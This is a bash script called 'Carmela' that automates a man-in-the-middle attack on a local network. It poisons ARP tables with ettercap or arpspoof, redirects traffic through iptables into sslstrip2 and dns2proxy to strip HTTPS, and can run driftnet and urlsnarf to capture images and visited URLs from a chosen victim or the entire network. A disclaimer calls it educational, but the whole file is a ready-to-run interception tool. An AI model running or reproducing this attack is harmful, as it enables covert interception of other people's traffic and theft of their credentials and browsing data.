	#!/bin/bash
	
	#<Carmela makes network traffic sniffing that much easier>
    	#Copyright (C) <2016>  <tastypeanut>

    	#This program is free software: you can redistribute it and/or modify
    	#it under the terms of the GNU General Public License as published by
   	#the Free Software Foundation, either version 3 of the License, or
    	#(at your option) any later version.

    	#This program is distributed in the hope that it will be useful,
    	#but WITHOUT ANY WARRANTY; without even the implied warranty of
    	#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    	#GNU General Public License for more details.

    	#You should have received a copy of the GNU General Public License
    	#along with this program.  If not, see <http://www.gnu.org/licenses/>.


	clear
	tput sgr0;
	tput bold; tput setaf 6;
	echo -e "
  ____                          _       
 / ___|__ _ _ __ _ __ ___   ___| | __ _ 
| |   / _' | '__| '_ ' _ \ / _ \ |/ _' |
| |__| (_| | |  | | | | | |  __/ | (_| |
 \____\__,_|_|  |_| |_| |_|\___|_|\__,_|  EASY NETWORK SNIFFING
                                        
===================================================================

This tool is only for educational purposes, any illegal activity done with it falls exclusively under the user's responsability. The developer isn't responsible for any actions done by the user. Sniffing someone's traffic without their express permission and the network owner's authorisation is ILLEGAL. This program is in it's early stages of development and may contain bugs. By starting Carmela you are accepting these terms. 

"
	tput sgr0;
	tput bold;tput setaf 7; 
	echo "
Start? (y/n):";
	tput sgr0;
	tput dim;
	read -r answer
	if [[ $answer = N || $answer = n  ]];
		then 
		tput sgr0;
		tput bold;tput setaf 7 
		echo "
OK BYE.";
		tput sgr0;
		exit
			elif [[ $answer = Y || $answer = y  ]];
			then 
			tput sgr0;
			tput bold;tput setaf 7; 
			echo "
OK GREAT, LET'S START.";
			else 
			tput sgr0;
			tput bold;tput setaf 7;
			echo "
INVALID ANSWER, EXITING NOW."; 
			tput sgr0;
			sleep 1;
			exit
		fi
	
	(
		if [ ! -f /usr/lib/Carmela ]
			then 
			(
				cd /usr/lib && 
				touch Carmela
			) &&
			tput sgr0;
			tput bold;tput setaf 2; 
			echo "
[+] INSTALLING SSLSTRIP2";
			tput sgr0;
			tput dim; 
			cd masters/sslstrip2master &&
			python setup.py install
		fi
	)
	sleep 1
	tput sgr0;
	tput bold;tput setaf 2;
	echo "
[+] FLUSHING IPTABLES..."
	echo "1" > /proc/sys/net/ipv4/ip_forward
	iptables --flush
	iptables --flush -t nat
	sleep 1
	echo "
[+] REDIRECTING PORTS..."
	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000
	iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
	tput sgr0;
	tput bold;tput setaf 7;
	sleep 1
	echo "
Time to configure the network sniffer, please type in the name of the network interface to sniff, you can check which one you are using by typing 'ifconfig' in a separate terminal."
	tput sgr0; 
	tput dim
	read -r interface
	tput sgr0;
	tput bold;tput setaf 7;
	echo "
Would you like to perform the attack on a certain victim or on the entire network?"
	tput sgr0;
	tput bold;tput setaf 2;
	echo "
1: On a certain victim.
2: On the entire network."
	tput sgr0;
	tput bold;tput setaf 7;
	echo "
Type in the number of the option you would like to select:"
	tput sgr0;
	tput dim;
	read -r option
	if [[ $option = 1 ]]; #if1
		then
		tput sgr0;
		tput bold;tput setaf 7;
		echo "
Now choose the network sniffer you would like to use to perform the attack:"
		tput sgr0;
		tput bold;tput setaf 2;
		echo "
1: Ettercap.
2: Arpspoof."
		tput sgr0;
		tput bold;tput setaf 7;
		echo "
Type in the number of the option you would like to select:"
		tput sgr0;
		tput dim;
		read -r sniffer; 
		tput sgr0
		if [[ $sniffer = 1 ]]; #if2
			then
			tput sgr0; 
			tput bold;tput setaf 7;
			echo "
Ip of the gateway (you can check this by typing 'route -n' in a separate terminal):";
			tput sgr0;
			tput dim;
			read -r gatewayip;
			tput sgr0;
			tput bold;tput setaf 7;
			echo "
Ip of the victim:";
			tput sgr0;
			tput dim;
			read -r victimip;
			tput sgr0;
			tput bold;tput setaf 7; 
			echo "
Do you want to start sniffing?(y/n)"
			tput sgr0;
			tput dim;
			read -r shakespeare;
			tput sgr0
			if [[ $shakespeare = N || $shakespeare = n  ]]
				then 
				tput sgr0; 
				tput bold;tput setaf 7;
				echo "
OK THEN, EXITING THE PROGRAM";
				tput sgr0;
				sleep 1;
				exit
			fi
			if [[ "$shakespeare" -ne "N"&&"$shakespeare" -ne "Y"&&"$shakespeare" -ne "n"&&"$shakespeare" -ne "y" ]]
				then  tput sgr0; 
				tput bold;tput setaf 7;
				echo "
INVALID ANSWER, EXITING NOW."; 
				tput sgr0;
				sleep 1;
				exit
			fi
			if [[ $shakespeare = Y || $shakespeare = y  ]]
				then 
				tput sgr0; 
				tput bold;tput setaf 7;
				echo "
STARTING THE SNIFFING...";
			fi
			tput sgr0;
			tput bold;tput setaf 1; 
			sleep 1;
  			echo "
Starting dns2proxy...";
 			(
      				cd masters && 
				cd dns2proxymaster && 
				gnome-terminal -e  "python dns2proxy.py"
    			)
    			sleep 2;
    			echo "
Starting sslstrip version 2...";
    			gnome-terminal -e  "sslstrip -l 9000";
    			sleep 2;
    			echo "
Starting Ettercap...";
    			gnome-terminal -e  "ettercap -Tqi $interface -M arp:remote /$gatewayip///$victimip/ -P autoadd";
    			sleep 3
    			tput sgr0;
			tput bold;tput setaf 2 ;
			echo "
Sniffing..."
  		fi #fi2
  		if [[ $sniffer = 2 ]]; #if3
  			then
    			tput sgr0;
			tput bold;tput setaf 7; 
			echo "
Ip of the gateway (you can check this by typing 'route -n' in a separate terminal):";
    			tput sgr0;
			tput dim;
			read -r gatewayip;
			tput sgr0;
			tput bold;tput setaf 7;
    			echo "
Ip of the victim:";
    			tput sgr0;
			tput dim;
			read -r victimip;
			tput sgr0;
			tput bold;tput setaf 7;
    			echo "
Do you want to start sniffing?(y/n)"
    			tput sgr0;
			tput dim;
			read -r shakespeare;
			tput sgr0;
			tput bold;tput setaf 7;
			if [[ $shakespeare = N || $shakespeare = n  ]]
    				then 
				tput sgr0;
				tput bold;tput setaf 7;
				echo "
OK THEN, EXITING THE PROGRAM";	
				tput sgr0;
				sleep 1;
				exit	
	    		fi
	   		if [[ "$shakespeare" -ne "N"&&"$shakespeare" -ne "Y"&&"$shakespeare" -ne "n"&&"$shakespeare" -ne "y" ]]
			   	then 
				tput sgr0;
				tput bold;tput setaf 7;
				echo "
INVALID ANSWER, EXITING NOW."; 
				tput sgr0;
				sleep 1;
				exit
	  		fi
	    		if [[ $shakespeare = Y || $shakespeare = y  ]]
    				then 
				tput sgr0; 
				tput bold;tput setaf 7;
				echo "
STARTING THE SNIFFING...";
			fi
			tput sgr0;
			tput bold;tput setaf 1;
			sleep 1
  			echo "
Starting dns2proxy..."
  			(
  				cd masters &&
				cd dns2proxymaster && 
				gnome-terminal -e  "python dns2proxy.py"
  			)
  			sleep 2
  			echo "
Starting sslstrip version 2..."
    			gnome-terminal -e  "sslstrip -l 9000"
    			sleep 2
    			echo "
Starting Arpspoof..."
    			gnome-terminal -e  "arpspoof -i $interface -t $gatewayip $victimip"
    			sleep 2
    			gnome-terminal -e  "arpspoof -i $interface -t $victimip $gatewayip"
    			sleep 3
    			tput sgr0;
			tput bold;tput setaf 2;
			echo "
Sniffing..."
  		fi #fi3	
  		if [[ "$sniffer" -ne "1"&&"$sniffer" -ne "2" ]]
  			then 
			tput sgr0;
			tput bold;tput setaf 7;
			echo "
INVALID ANSWER, EXITING NOW."; 
			tput sgr0;
			sleep 1;
			exit
  		fi
	fi #fi1
	if [[ $option = 2 ]]; #if4
		then 
		tput sgr0;
		tput bold;tput setaf 7;
		echo "
Do you want to start sniffing?(y/n)"
  		tput sgr0;
		tput dim;
		read -r shakespeare;
		tput sgr0;
		tput bold;tput setaf 7;
  		if [[ $shakespeare = N || $shakespeare = n  ]]
  			then 
			echo "
OK THEN, EXITING THE PROGRAM";
			tput sgr0;	
			sleep 1;
			exit
		fi
  		if [[ "$shakespeare" -ne "N"&&"$shakespeare" -ne "Y"&&"$shakespeare" -ne "n"&&"$shakespeare" -ne "y" ]]
  			then 
			tput sgr0;
			tput bold;tput setaf 7;
			echo "
INVALID ANSWER, EXITING NOW."; 
			tput sgr0;
			sleep 1;
			exit
  		fi
  		if [[ $shakespeare = Y || $shakespeare = y  ]]
  			then 	
			tput sgr0;	
			tput bold;tput setaf 7;
			echo "
STARTING THE SNIFFING...";
  		fi
  		sleep 1
  		tput sgr0;
		tput bold;tput setaf 1;
		echo "
Starting dns2proxy..."
  		(
  			cd masters && 
			cd dns2proxymaster && 
			gnome-terminal -e  "python dns2proxy.py"
  		)
  		sleep 2
  		echo "
Starting sslstrip version 2..."
  		gnome-terminal -e  "sslstrip -l 9000"
  		sleep 2
  		echo "
Starting Ettercap..."
  		gnome-terminal -e  "ettercap -Tqi $interface -M arp:remote -P autoadd"
  		sleep 3
		tput sgr0;
		tput bold;tput setaf 2 ;
		echo "
Sniffing..."
	fi #fi4	
	if [[ "$option" -ne "1"&&"$option" -ne "2"&&"$sniffer" -ne "1"&&"$sniffer" -ne "2" ]];
		then 
		tput sgr0;
		tput bold;tput setaf 7;
		echo "
INVALID ANSWER, EXITING NOW."; 
		tput sgr0;
		sleep 1;
		exit
	fi
	tput sgr0;
	tput bold;tput setaf 7;
	echo "
Would you like to run Driftnet?(y/n):
Driftnet  watches  network  traffic and picks out and displays JPEG and GIF images for display. You can save images to the current directory by clicking on them.
At the moment Driftnet is only capable of extracting content from websites using http."
	tput sgr0;
	tput dim;
	read -r driftnet;
	tput sgr0;
	tput bold;tput setaf 7;
	if [[ $driftnet = Y || $driftnet = y  ]];
		then 
		tput sgr0;
		tput bold;tput setaf 2;
		echo "
OK GREAT, STARTING DRIFTNET...";
		gnome-terminal -e  "driftnet -i $interface"
	fi
	if [[ "$driftnet" -ne "N"&&"$driftnet" -ne "Y"&&"$driftnet" -ne "n"&&"$driftnet" -ne "y" ]];
		then 
		tput sgr0;
		tput bold;tput setaf 7; 
		echo "
INVALID ANSWER, EXITING NOW."; 
		tput sgr0;
		sleep 1;
		exit
	fi
	tput sgr0;
	tput bold;tput setaf 7;
	echo "
Would you like to run URLSnarf?(y/n):
URLSnarf outputs all requested URLs sniffed from HTTP traffic."
	tput sgr0;
	tput dim;
	read -r urlsnarf;
	tput sgr0;
	tput bold;tput setaf 7;
	if [[ $urlsnarf = N || $urlsnarf = n  ]];
		then 
		tput sgr0;
		tput bold;tput setaf 7;
		echo "
OK, ENDING CARMELA.";
		sleep 2; 
		exit
			elif [[ $urlsnarf = Y || $urlsnarf = y  ]];
			then 
			tput sgr0;
			tput bold;tput setaf 7;
			echo "
How would you like to run URLSnarf?"
			tput sgr0;
			tput bold;tput setaf 2 ;
			echo "
1: Full output (spews out large amounts of information, such as browser version, URLs visited, or OS)
2: Easy to read output (only shows visited URLs)"
		 	tput sgr0;
			tput bold;tput setaf 7;
			echo "
Type in the number of the option you would like to select:"
		fi
	tput sgr0;
	tput dim;
	read -r outputtype;
	tput sgr0;
	tput bold;tput setaf 7;
	if [[ $outputtype = 1 ]]
		then 
		tput sgr0;
		tput bold;tput setaf 2; 
		echo "
OK GREAT, STARTING URLSNARF IN FULL OUTPUT MODE...";
		gnome-terminal -e  "urlsnarf -i $interface"
	fi
	if [[ $outputtype = 2 ]]
		then 
		tput sgr0;
		tput bold;tput setaf 2 ;
		echo "
OK GREAT, STARTING URLSNARF IN EASY TO READ MODE...";
		gnome-terminal -x bash -c "urlsnarf -i wlan0 | cut '-d\"' -f4"
	fi
	if [[ "$outputtype" -ne "1"&&"$outputtype" -ne "2" ]];
		then 
		tput sgr0;
		tput bold;tput setaf 7;
		echo "
INVALID ANSWER, EXITING NOW."; 
		tput sgr0;
		sleep 1;
		exit
	fi
	sleep 3









